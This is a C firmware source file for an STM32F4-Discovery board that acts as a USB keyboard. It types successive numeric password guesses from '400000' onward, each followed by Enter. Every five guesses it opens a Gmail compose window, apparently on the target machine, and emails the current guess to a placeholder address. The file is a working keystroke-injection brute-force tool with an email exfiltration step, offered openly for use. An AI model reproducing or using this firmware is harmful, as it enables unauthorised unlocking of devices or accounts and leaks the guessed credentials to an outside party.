/**
  ******************************************************************************
  * @file    main.c 
  * @author  Brett Brotherton
  * @version V1.0.0
  * @date    2013-11-03
  * @brief   Main program body
  ******************************************************************************
  * @attention
  *
  * Note this is modified from the STMicro Demo project main,  The framework is 
  * from there and the meat of the code is my own work
  * 
  * 
  * 
  * 
  * Original Copyright notice:
  * 
  * THE PRESENT FIRMWARE WHICH IS FOR GUIDANCE ONLY AIMS AT PROVIDING CUSTOMERS
  * WITH CODING INFORMATION REGARDING THEIR PRODUCTS IN ORDER FOR THEM TO SAVE
  * TIME. AS A RESULT, STMICROELECTRONICS SHALL NOT BE HELD LIABLE FOR ANY
  * DIRECT, INDIRECT OR CONSEQUENTIAL DAMAGES WITH RESPECT TO ANY CLAIMS ARISING
  * FROM THE CONTENT OF SUCH FIRMWARE AND/OR THE USE MADE BY CUSTOMERS OF THE
  * CODING INFORMATION CONTAINED HEREIN IN CONNECTION WITH THEIR PRODUCTS.
  *
  * <h2><center>&copy; COPYRIGHT 2011 STMicroelectronics</center></h2>
  ******************************************************************************
  */ 

/* Includes ------------------------------------------------------------------*/
#include "main.h"
#include "usbd_hid_core.h"
#include "usbd_usr.h"
#include "usbd_desc.h"
#include "keyboard.h"
#include "permute.h"
#include <string.h>

/** @addtogroup STM32F4-Discovery_Demo
  * @{
  */

/* Private typedef -----------------------------------------------------------*/
/* Private define ------------------------------------------------------------*/

#define TESTRESULT_ADDRESS         0x080FFFFC
#define ALLTEST_PASS               0x00000000
#define ALLTEST_FAIL               0x55555555

/* Private macro -------------------------------------------------------------*/
/* Private variables ---------------------------------------------------------*/
#ifdef USB_OTG_HS_INTERNAL_DMA_ENABLED
  #if defined ( __ICCARM__ ) /*!< IAR Compiler */
    #pragma data_alignment = 4   
  #endif
#endif /* USB_OTG_HS_INTERNAL_DMA_ENABLED */
__ALIGN_BEGIN USB_OTG_CORE_HANDLE  USB_OTG_dev __ALIGN_END;
  
uint16_t PrescalerValue = 0;

__IO uint32_t TimingDelay;
__IO uint8_t DemoEnterCondition = 0x00;
__IO uint8_t UserButtonPressed = 0x00;
LIS302DL_InitTypeDef  LIS302DL_InitStruct;
LIS302DL_FilterConfigTypeDef LIS302DL_FilterStruct;  
__IO int8_t X_Offset, Y_Offset, Z_Offset  = 0x00;
uint8_t Buffer[6];

/* Private function prototypes -----------------------------------------------*/
static uint32_t Demo_USBConfig(void);


/**
  * @brief  Main program.
  * @param  None
  * @retval None
  */
int main(void)
{
  uint32_t guessIdx = 0;
  int running = 0;
  int delay = 0;
  RCC_ClocksTypeDef RCC_Clocks;
  
  /* Initialize LEDs and User_Button on STM32F4-Discovery --------------------*/
  STM_EVAL_PBInit(BUTTON_USER, BUTTON_MODE_EXTI); 
  
  STM_EVAL_LEDInit(LED4);
  STM_EVAL_LEDInit(LED3);
  STM_EVAL_LEDInit(LED5);
  STM_EVAL_LEDInit(LED6);
  
  /* SysTick end of count event each 10ms */
  RCC_GetClocksFreq(&RCC_Clocks);
  SysTick_Config(RCC_Clocks.HCLK_Frequency / 100);
  STM_EVAL_LEDOff(LED4);
  STM_EVAL_LEDOn(LED3);
  STM_EVAL_LEDOff(LED5);
  STM_EVAL_LEDOff(LED6);
  STM_EVAL_PBInit(BUTTON_USER, BUTTON_MODE_GPIO);
  keyboardInit(&USB_OTG_dev);
  Demo_USBConfig();
  char guess[7];
  strcpy(guess, "400000");
  Delay(2000);
  while (1) {
    if (STM_EVAL_PBGetState(BUTTON_USER) == Bit_SET) {
      //crappy debounce routine
      TimingDelay = 10;
      while ((STM_EVAL_PBGetState(BUTTON_USER) == Bit_SET)&&(TimingDelay != 0x00));
      //now change start or stop password attempts
      if (running == 0) {
        STM_EVAL_LEDOn(LED4);
        running = 1;
      } else {
        STM_EVAL_LEDOff(LED4);
        running = 0;
      }
    }
    //mostly non blocking delay to allow stopping with button
    if (delay > 0) {
      Delay(1000);
      delay--;
    }
    if (running != 0 && delay == 0) {
      Delay(200);
      keyboardWrite(KEY_BACKSPACE);
      keyboardWrite(KEY_BACKSPACE);
      keyboardWrite(KEY_BACKSPACE);
      keyboardWrite(KEY_BACKSPACE);
      STM_EVAL_LEDToggle(LED6);
      keyboardPutString(guess);
      keyboardWrite(KEY_RETURN);
      Delay(200);
      keyboardWrite(KEY_RETURN);
      
      nextPermutation(guess, "123", 1, 0);
      
      if ((++guessIdx % 5) == 0) {
        //try to email every 5 guesses
        keyboardReleaseAll();
        keyboardPress(KEY_LEFT_GUI);
        keyboardPress('g');
        Delay(50);
        keyboardReleaseAll();
        keyboardPutString("cyouremail@yourdomain.com"); //leave the preceding 'c' that is the gmail compose shortcut
        keyboardWrite(KEY_TAB);
        keyboardPutString(guess);
        keyboardWrite(KEY_TAB);
        keyboardPutString(guess);
        keyboardWrite(KEY_TAB);
        keyboardWrite(KEY_TAB);
        keyboardWrite(KEY_RETURN);
        STM_EVAL_LEDOff(LED5);
        delay = 30;
      }
    }
  }
}

/**
  * @brief  Initializes the USB for the demonstration application.
  * @param  None
  * @retval None
  */
static uint32_t Demo_USBConfig(void)
{
  USBD_Init(&USB_OTG_dev,
            USB_OTG_FS_CORE_ID,
            &USR_desc, 
            &USBD_HID_cb, 
            &USR_cb);
  
  return 0;
}

/**
  * @brief  Inserts a delay time.
  * @param  nTimeMs: specifies the delay time length, in  ms (resolution is 40 ms so actual time may vary by up to 40 ms)
  * @retval None
  */
void Delay(__IO uint32_t nTimeMs)
{
  //find nearest delay we can do
  TimingDelay = nTimeMs/40+1;

  while(TimingDelay != 0);
}

/**
  * @brief  Decrements the TimingDelay variable.
  * @param  None
  * @retval None
  */
void TimingDelay_Decrement(void)
{
  if (TimingDelay != 0x00)
  { 
    TimingDelay--;
  }
}

#ifdef  USE_FULL_ASSERT

/**
  * @brief  Reports the name of the source file and the source line number
  *   where the assert_param error has occurred.
  * @param  file: pointer to the source file name
  * @param  line: assert_param error line source number
  * @retval None
  */
void assert_failed(uint8_t* file, uint32_t line)
{ 
  /* User can add his own implementation to report the file name and line number,
     ex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */

  /* Infinite loop */
  while (1)
  {
  }
}
#endif

/**
  * @}
  */


/******************* (C) COPYRIGHT 2011 STMicroelectronics *****END OF FILE****/
